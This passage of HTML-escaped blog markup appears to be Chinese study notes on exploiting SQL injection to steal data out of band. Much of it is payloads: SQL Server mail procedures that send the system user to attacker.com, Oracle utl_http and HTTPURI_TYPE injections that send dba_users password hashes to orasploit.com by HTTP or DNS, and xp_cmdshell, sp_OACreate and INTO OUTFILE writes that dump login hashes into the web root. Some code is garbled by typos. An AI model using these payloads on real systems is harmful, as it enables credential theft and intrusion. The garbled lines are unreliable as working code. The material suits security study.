&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;xp_sendmail &lt;span class=&#34;token variable&#34;&gt;@recipients&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;admin@attacker.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@query&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;select @@version&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Database Mail&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;--Enable Database Mail&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;token string&#34;&gt;&#39;show advanced&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;RECONFIGURE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_configure &lt;span class=&#34;token string&#34;&gt;&#39;Database Mail XPs&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;RECONFIGURE&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- Create a new account, MYACC. The SMTP server is provided in this call. &lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; msdb&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sysmail_add_account_sp&lt;span class=&#34;token variable&#34;&gt;@account_name&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MYACC&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@email_address&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;hacked@victim.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@display_name&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;mls&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@mailserver_name&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;smtp.victim.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;@account_id&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- Create a new profile, MYPROFILE&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; msdb&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sysmail_adci_profile_sp&lt;span class=&#34;token variable&#34;&gt;@profile_name&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;MYPROFILE&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@description&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@profile_id&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- Bind the account to the profile&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; msdb&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sysmail_add_profileaccount_sp &lt;span class=&#34;token variable&#34;&gt;@profile_name&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MYPROFILE&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@account_name&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;acc&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@sequence_number&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- Retrieve login&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@b&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VARCHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@b&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SYSTEM_USER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- Send the mail&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; msdb&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sp_send_dbmail &lt;span class=&#34;token variable&#34;&gt;@profile_name&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;MYPROFILE&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;@
recipients&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;allyrbase@attacker.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@subject&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; system user&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@body&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@b&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;Oracle-3&#34;&gt;&lt;a href=&#34;#Oracle-3&#34; class=&#34;headerlink&#34; title=&#34;Oracle&#34;&gt;&lt;/a&gt;Oracle&lt;/h5&gt;&lt;p&gt;UTL_SMTP提供了一系列函数来启动并管理一个SMTP连接：先使 用UTL_SMTP.OPEN_CONNECTION与服务器取得联系，之后使用UTL_SMTP.HELLO向服务器发送“HELLO”消息，接着分别使用UTL_SMTP.MAIL和UTL_SMTP.RCP指定发送者和接收者，接下来使用UTL_SMTP.DATA指定消息，最后使用UTL_SMTP.QUIT终止会话。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;UTL_MAIL&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;SEND&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sender&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; recipient&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; cc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; bcc&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; subject&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; message&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; mime_type&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; priority&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;HTTP-DNS&#34;&gt;&lt;a href=&#34;#HTTP-DNS&#34; class=&#34;headerlink&#34; title=&#34;HTTP/DNS&#34;&gt;&lt;/a&gt;HTTP/DNS&lt;/h4&gt;&lt;p&gt;Oracle 还提供了两种执行 HTTP 请求的方法:UTL_ HTTP 和 HTTPURI TYPEoUTL_ HTTP 包和HTTPURI_TYPE对象类型默认授权给了公共角色，可以由数据库所有用户执行或通过 SQL注入加以执行。&lt;/p&gt;
&lt;p&gt;要想向远程系统发送SYS用户的哈希口令，可注入下列字符串：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; l&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;utl_http&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;http://www.orasploit.com/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; password &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dba_users &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; rownum&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;l&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;也可以借助于HTTPURI_TYPE对象类型，如下所示：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;HTTPURI_TYPE&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;http://www.orasploit.com/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; password &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; dba_users &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; rownum&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;l&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;getclob&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果SQL查询写在URL内部，那么还可以通过域名系统(Domain Name System,DNS)查询来发送数据(最大为64字节)。该查询作用于外部站点&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; utl_http&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;request&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;http://www.&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;selectpasswordfromdba_userswhererownum&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;l&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;.orasploit.com/&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;文件系统&#34;&gt;&lt;a href=&#34;#文件系统&#34; class=&#34;headerlink&#34; title=&#34;文件系统&#34;&gt;&lt;/a&gt;文件系统&lt;/h4&gt;&lt;p&gt;如果攻击者拥有足够的写文件系统的权限，那么他就可以将查询结果重定向到Web服务器根目录下的一个文件中，之后他便可以使用浏览器来正常访问该文件。&lt;/p&gt;
&lt;h5 id=&#34;SQL-Server-3&#34;&gt;&lt;a href=&#34;#SQL-Server-3&#34; class=&#34;headerlink&#34; title=&#34;SQL Server&#34;&gt;&lt;/a&gt;SQL Server&lt;/h5&gt;&lt;p&gt;检索sql_logins表中第一个用户的用户名和哈希，将该值重定向到文件系统的一个文本文件中&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- Declare needed variables&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@a&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@hash&lt;/span&gt; nvarchar&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@fileid&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- Take the username and password hash of the first user in sql_logins &lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- and store it into the variable @hash&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;top&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@hash&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; name &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;|&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;master&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dbo&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fn_varbintohexstr&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;password_hash&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sql_logins&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token comment&#34;&gt;-- Create a FileSystemObject pointing to the location of the desired file&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_OACreate &lt;span class=&#34;token string&#34;&gt;&#39;Scripting.FileSystemObject&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@a&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OUT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_OAMethod &lt;span class=&#34;token variable&#34;&gt;@a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;OpenTextFile&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@fileid&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OUT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;c:\inetpub\wwwroot\hash.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- Write the @hash variable into that file&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_OAMethod &lt;span class=&#34;token variable&#34;&gt;@fileid&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;WriteLine&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;Null&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@hash&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; 
&lt;span class=&#34;token comment&#34;&gt;-- Destroy the objects that are not needed anymore&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_OADestroy &lt;span class=&#34;token variable&#34;&gt;@fileid&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; sp_OADestroy &lt;span class=&#34;token variable&#34;&gt;@a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;利用自带工具bcp.exe&lt;/p&gt;
&lt;p&gt;检索整张sql_logins表&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt; xp_cmdshell &lt;span class=&#34;token string&#34;&gt;&#39;bcp &#34;select * from sys.sql_logins&#34; queryout c:\inetpub\wwwroot\hashes.txt -T -c&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;Mysql-2&#34;&gt;&lt;a href=&#34;#Mysql-2&#34; class=&#34;headerlink&#34; title=&#34;Mysql&#34;&gt;&lt;/a&gt;Mysql&lt;/h5&gt;&lt;p&gt;为确定用户是否拥有FILE权限，可使用下面两种查询之一进行测试&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; file_priv &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; mysql&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;username&#39;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;-- MySQL 4/5&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; grantee&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;is_grantable &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;user_privileges &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; privilege_type &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;file&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; grantee &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;username&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;假设用户拥有这样的权限，而且知道Web站点的根目录为/webroot/且MySQL用户能够对该目录进行写访问，那么可注入下列查询：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; table_name &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; information_schema&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;tables&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OUTFILE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/webroot/tables.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;Oracle-4&#34;&gt;&lt;a href=&#34;#Oracle-4&#34; class=&#34;headerlink&#34; title=&#34;Oracle&#34;&gt;&lt;/a&gt;Oracle&lt;/h5&gt;&lt;p&gt;在Oracle中，大多数用于访问文件的方法(UTL_FILE、DBMS_LOB外部表和Java)都需要一个PL/SQL注入漏洞，因而无法被用到SQL注入场景中。&lt;/p&gt;
&lt;h5 id=&#34;在移动设备上实施SQL注入&#34;&gt;&lt;a href=&#34;#在移动设备上实施SQL注入&#34; class=&#34;headerlink&#34; title=&#34;在移动设备上实施SQL注入&#34;&gt;&lt;/a&gt;在移动设备上实施SQL注入&lt;/h5&gt;&lt;p&gt;SQLite&lt;/p&gt;
&lt;p&gt;建立监听通信&lt;/p&gt;
&lt;h3 id=&#34;自动利用SQL注入&#34;&gt;&lt;a href=&#34;#自动利用SQL注入&#34; class=&#34;headerlink&#34; title=&#34;自动利用SQL注入&#34;&gt;&lt;/a&gt;自动利用SQL注入&lt;/h3&gt;&lt;h4 id=&#34;Sqlmap&#34;&gt;&lt;a href=&#34;#Sqlmap&#34; class=&#34;headerlink&#34; title=&#34;Sqlmap&#34;&gt;&lt;/a&gt;Sqlmap&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;http://sqlmap.sourceforge.net/&#34;&gt;http://sqlmap.sourceforge.net&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;Bobcat&#34;&gt;&lt;a href=&#34;#Bobcat&#34; class=&#34;headerlink&#34; title=&#34;Bobcat&#34;&gt;&lt;/a&gt;Bobcat&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;http://www.northem-monkee.co.uk/projects/bobcat/bobcat.html&#34;&gt;www.northem-monkee.co.uk/projects/bobcat/bobcat.html&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;BSQL&#34;&gt;&lt;a href=&#34;#BSQL&#34; class=&#34;headerlink&#34; title=&#34;BSQL&#34;&gt;&lt;/a&gt;BSQL&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;http://code.google.eom/p/bsqlhacker/&#34;&gt;http://code.google.eom/p/bsqlhacker/&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;其他-1&#34;&gt;&lt;a href=&#34;#其他-1&#34; class=&#34;headerlink&#34; title=&#34;其他&#34;&gt;&lt;/a&gt;其他&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;FG-Injection Framework (&lt;a href=&#34;http://sourceforge.net/projects/injection-fwk/&#34;&gt;http://sourceforge.net/projects/injection-fwk/&lt;/a&gt;)&lt;/p&gt;
&lt;/li&gt;
